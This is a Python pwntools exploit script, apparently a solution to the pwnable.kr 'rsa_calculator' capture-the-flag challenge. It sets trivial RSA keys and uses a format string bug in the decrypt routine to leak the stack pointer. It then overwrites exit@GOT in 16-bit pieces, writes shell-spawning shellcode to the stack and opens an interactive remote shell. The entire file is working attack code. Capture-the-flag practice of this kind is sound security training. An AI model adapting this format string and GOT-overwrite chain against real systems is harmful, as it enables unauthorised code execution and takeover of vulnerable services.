from pwn import *

elf = context.binary = ELF("./rsa_calculator")
r = remote("pwnable.kr",9012)

def generate_key_pair():
    # Hardocoded
    return {'p': 10000, 'q': 10000, 'e': 1, 'd': 1}

def set_key_pair():
    keys = generate_key_pair()
    r.sendline(b"1")
    r.sendline(str(keys["p"]).encode())
    r.sendline(str(keys["q"]).encode())
    r.sendline(str(keys["e"]).encode())
    r.sendline(str(keys["d"]).encode())

def encrypt(msg):
    r.sendline(b"2")
    r.sendline(str(len(msg)).encode())
    r.sendline(msg)
    r.recvuntil(b" (hex encoded) -\n")
    return r.recvline().strip()

def decrypt(l, hexdata):
    r.sendline(b"3")
    r.sendline(str(l*8).encode())
    r.sendline(hexdata)
    r.recvuntil(b"result -\n")
    return r.recvline().strip()

def write_short(offset,write):
    payload = fmtstr_payload(offset,write,write_size="short",write_size_max="short")
    hexdata = encrypt(payload)
    decrypt(len(payload),hexdata)

set_key_pair()

# Leak rbp
fstring = b"%219$p"
hexdata = encrypt(fstring)
output = decrypt(len(fstring),hexdata)
rbp = int(output[:14],16) - 0x100
sh_addr = rbp - 0x410
log.success("RBP leaked: " + hex(rbp))

# Overwrite exit@GOT
write_short(76,{0x602068: (sh_addr) & 0xFFFF})
write_short(76,{0x602068 + 2: (sh_addr >> 16) & 0xFFFF})
write_short(76,{0x602068 + 4: (sh_addr >> 32) & 0xFFFF})

# Write shellcode
shellcode = asm(shellcraft.sh())
hexdata = encrypt(shellcode)
decrypt(len(shellcode),hexdata)

# Shell
r.sendline(b"5")
r.interactive()
